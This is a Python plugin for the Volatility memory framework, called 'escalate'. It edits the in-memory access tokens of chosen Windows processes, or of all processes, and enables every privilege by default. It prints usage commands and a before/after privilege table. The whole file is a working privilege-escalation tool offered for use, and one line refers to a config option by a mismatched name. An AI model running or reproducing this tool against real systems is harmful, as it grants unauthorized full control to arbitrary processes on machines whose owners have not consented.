# Volatility
#
# Authors
# Adam Traub <traubad@vcu.edu>
# Sourab Vadlamani <vadlamanis3@vcu.edu>
#
# This file is part of Volatility.
#
# Volatility is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# Volatility is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Volatility.  If not, see <http://www.gnu.org/licenses/>.
#

import volatility.obj as obj
import volatility.debug as debug

import volatility.plugins.common as common
import volatility.utils as utils
import volatility.win32 as win32


class escalate(common.AbstractWindowsCommand):

    def __init__(self, config, *args, **kwargs):
        common.AbstractWindowsCommand.__init__(self, config, *args, **kwargs)

        # Add command line options
        self._config.add_option('PID', short_option='i', type="string", default=None,
            help='ID of Process to Escalate, multiple pids can be separated with commas', action='store')

        self._config.add_option('NAME', short_option='n', type='string', default=None,
            help='Name of Process to Escalate, multiple names can be separated with commas', action='store')

        self._config.add_option('PRIV', short_option='p', type='string', default='FFFFFFFFFFFFFFFF',
            help='hex value to set privilege', action='store')

        self._config.add_option('ALL', short_option='a', action="store_true",
            help="Escalate all Processes", default=False)

        # If invalid command line arguments
        if self._config.PID is None and self._config.NAME is None and not self._config.ALL and not self._config.help:
            raise(Exception("Either a process id or a Process name is required e.g." +
                            "\n\tescalate -i 1104 --write" +
                            "\n\tescalate -i 1104,952 --write" +
                            "\n\tescalate -i 1104 --write -p 00F00F00F00F000F" +
                            "\n\tescalate -n cmd.exe --write"+
                            "\n\tescalate -n cmd.exe,explorer --write"+
                            "\n\tescalate -a --write"))

        self._addrspace = None
        self._proc = None


    def get_target_proc(self, pid):
        '''
        Gets the target process' data structure
        :param pid: The target PID
        :return: The target process
        '''

        # Get all active processes
        procs = win32.tasks.pslist(self._addrspace)

        # Get proceess with specified PID
        for proc in procs:
            if proc.UniqueProcessId.v() == pid:
                offset = proc.v()
                break
        else:
            raise(Exception("PID not Found (Something is very wrong!)"))

        return obj.Object("_EPROCESS", offset=offset, vm=self._addrspace)


    def perform_atack(self):
        '''
        Performs the escalation attack
        :return: Nothing
        '''

        # Set privilege of target process(s) to specified escalated privileges
        for proc in self._proc:
            proc.get_token().Privileges.Enabled = self.PRIV


    def get_pid_from_name(self, name):
        '''
        Gets the PID of a process if name is given
        :param name: THe target process' name
        :return: The target process' PID
        '''

        # Get all processes and return PID of process which name matches with specified name
        for proc in win32.tasks.pslist(self._addrspace):
            if str(proc.ImageFileName) == name:
                return proc.UniqueProcessId.v()
        else:
            raise(Exception("Bad Process name: {}".format(name)))


    def get_name_from_pid(self, pid):
        '''
        Gets the name of a process if pid is given
        :param name: THe target process' pid
        :return: The target process' name
        '''

        # Get all processes and return name of process whose PID matches PID supplied to this function
        for proc in win32.tasks.pslist(self._addrspace):
            if proc.UniqueProcessId.v() == pid:
                return str(proc.ImageFileName)
        else:
            raise(Exception("Bad PID: {}".format(pid)))


    def render_text(self, outfd, data):
        self._addrspace = utils.load_as(self._config)
        self.PRIV = int(self._config.PRIV, 16)

        # If not escalating all active processes
        if not self._config.ALL:
            # Parse input PIDs
            pid = self._config.PID.split(",") if self._config.PID is not None else [None]

            # Parse input names
            name = self._config.NAME.split(",") if self._config.Name is not None else [None]

            # If no PIDs are supplied, get respective PIDs from supplied names
            if pid == [None]:
                pid = [self.get_pid_from_name(n) for n in name]

            # PIDs are supplied and get names of supplied PIDs
            else:
                pid = [int(p) for p in pid]
                if name != [None]:
                    outfd.write("Name and PID were both supplied, disregarding name\n")
                name = [self.get_name_from_pid(p) for p in pid]

        else:
            # Get list all all active PIDs and process names
            pid = [proc.UniqueProcessId.v() for proc in win32.tasks.pslist(self._addrspace)]
            name = [self.get_name_from_pid(p) for p in pid]

        # Get list of process data structures (from PIDs)
        self._proc = [self.get_target_proc(p) for p in pid]

        # This list maintains the privileges of attacked processes before the attack is performed (for comparison)
        old_priv = [int(proc.get_token().Privileges.Enabled) for proc in self._proc]

        # FUN!
        self.perform_atack()

        # Write output
        outfd.write("{:20} {:10} {:16}    {:16}\n".format("Name", "PID", "Before", "After"))
        for n, p, old_p, new_p in zip(name, pid, old_priv, self._proc):
            outfd.write("{:20} {:10} {:016X}    {:016X}\n".format(n, str(p), old_p, new_p.get_token().Privileges.Enabled))
